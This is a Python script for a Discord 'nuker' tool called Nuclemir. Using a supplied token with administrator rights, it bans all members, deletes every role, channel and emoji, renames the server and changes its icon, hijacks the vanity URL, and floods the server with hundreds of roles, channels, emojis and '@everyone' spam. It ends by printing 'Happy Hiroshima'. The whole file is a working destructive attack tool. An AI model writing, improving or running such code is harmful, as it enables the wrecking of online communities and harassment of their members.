import discord
import asyncio
import requests
from io import BytesIO

class Nuclemir:
    def __init__(self):
        self.token = input("Enter your Discord token: ")
        self.server_id = int(input("Enter server ID: "))
        self.guild = None
        self.session = requests.Session()

    async def check_permissions(self):
        self.guild = discord.utils.get(self.client.guilds, id=self.server_id)
        if not self.guild:
            raise Exception("Server not found")
        
        member = self.guild.get_member(self.client.user.id)
        if not member.guild_permissions.administrator and member.id != self.guild.owner_id:
            raise Exception("Missing permissions")
    
    async def ban_members(self):
        for member in self.guild.members:
            if member != self.client.user:
                try: await member.ban(reason="Nuclemir")
                except: pass
            await asyncio.sleep(0.2)

    async def delete_roles(self):
        for role in self.guild.roles:
            if role.name != "@everyone":
                try: await role.delete()
                except: pass
            await asyncio.sleep(0.2)

    async def delete_channels(self):
        for channel in self.guild.channels:
            try: await channel.delete()
            except: pass
            await asyncio.sleep(0.2)

    async def modify_guild(self):
        try:
            img = BytesIO(self.session.get("https://i.imgur.com/CWMec9F.jpeg").content)
            await self.guild.edit(name="isfendiyar", icon=img.read())
        except: pass

    async def create_roles(self):
        for _ in range(250):
            try: await self.guild.create_role(name="isfendiyar")
            except: pass
            await asyncio.sleep(0.5)

    async def create_channels(self):
        for _ in range(500):
            try: await self.guild.create_text_channel(name="isfendiyar")
            except: pass
            await asyncio.sleep(0.5)

    async def spam_messages(self):
        for channel in self.guild.text_channels:
            try: await channel.send("@everyone isfendiyar")
            except: pass
            await asyncio.sleep(0.2)

    async def modify_vanity(self):
        try:
            if 'VANITY_URL' in self.guild.features:
                await self.guild.edit(vanity_code="isfendiyar")
        except: pass

    async def handle_emojis(self):
        for emoji in self.guild.emojis:
            try: await emoji.delete()
            except: pass
            await asyncio.sleep(0.2)

        img = self.session.get("https://i.imgur.com/CWMec9F.jpeg").content
        for i in range(250):
            try:
                await self.guild.create_custom_emoji(
                    name=f"isfendiyar_{i}", 
                    image=img
                )
                await asyncio.sleep(0.5)
            except: pass

    async def start(self):
        self.client = discord.Client()
        
        @self.client.event
        async def on_ready():
            try:
                await self.check_permissions()
                await self.ban_members()
                await self.delete_roles()
                await self.delete_channels()
                await self.modify_guild()
                await self.create_roles()
                await self.create_channels()
                await self.spam_messages()
                await self.modify_vanity()

                if input("Proceed with emoji operations? (y/n): ").lower() == 'y':
                    await self.handle_emojis()

                print("Happy Hiroshima")
            except Exception as e:
                print(f"Error: {e}")
            await self.client.close()

        await self.client.start(self.token)

if __name__ == "__main__":
    print("""███╗   ██╗██╗   ██╗ ██████╗██╗     ███████╗███╗   ███╗██╗██████╗ 
████╗  ██║██║   ██║██╔════╝██║     ██╔════╝████╗ ████║██║██╔══██╗
██╔██╗ ██║██║   ██║██║     ██║     █████╗  ██╔████╔██║██║██████╔╝
██║╚██╗██║██║   ██║██║     ██║     ██╔══╝  ██║╚██╔╝██║██║██╔══██╗
██║ ╚████║╚██████╔╝╚██████╗███████╗███████╗██║ ╚═╝ ██║██║██║  ██║
╚═╝  ╚═══╝ ╚═════╝  ╚═════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝""")
    bot = Nuclemir()
    asyncio.run(bot.start())